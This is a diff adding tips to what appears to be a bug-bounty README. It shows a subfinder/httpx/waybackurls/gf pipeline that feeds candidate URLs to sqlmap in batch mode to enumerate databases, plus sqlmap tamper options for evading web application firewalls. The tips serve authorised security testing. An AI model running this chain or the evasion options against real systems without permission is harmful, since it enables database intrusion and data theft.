@@ -156,3 +156,34 @@ cat domian.txt | httpx -o domainhttpx.txt
 cat domainhttpx.txt | nuclei -t /home/orwa/nuclei-templates
 ```
 DONE 😎
+
+
+## Find SQL injections (command combo)
+```
+subfinder -d target.com | tee -a domains
+cat domains | httpx | tee -a urls.alive
+cat urls.alive | waybackurls | tee -a urls.check
+gf sqli urls.check >> urls.sqli
+sqlmap -m urls.sqli --dbs --batch
+```
+Here’s what’s going on in detail:
+
+1. First we will find all subdomains under our target domain.
+2. Next we will identify all alive web servers running on those subdomains.
+3. Waybackurls will fetch all URLs that the Wayback Machine knows about the identified alive subdomains.
+4. Now we will filter out URLs that match patterns with potential SQL injection.
+5. The final step is to run sqlmap on all identified potentially vulnerable URLs and let it do its magic.
+
+Protip: If you need to bypass WAF (Web Application Firewall) in the process, add the following options to sqlmap:
+```
+--level=5 --risk=3 -p 'item1' --tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,ifnull2ifisnull,modsecurityversioned
+```
+
+## Get scope of Bugcrowd programs in CLI
+There is a new tool in town called bcscope which can get you the scope of all bug bounty programs available on Bugcrowd platform, including the private ones.
+
+All you have to do is to provide your Bugcrowd token like this:
+```
+bcscope -t <YOUR-TOKEN-HERE> -c 2 -p
+```
+![alt text](https://www.infosecmatter.com/wp-content/uploads/2020/10/list-scope-for-bugcrowd-bug-bounty-programs.jpg)
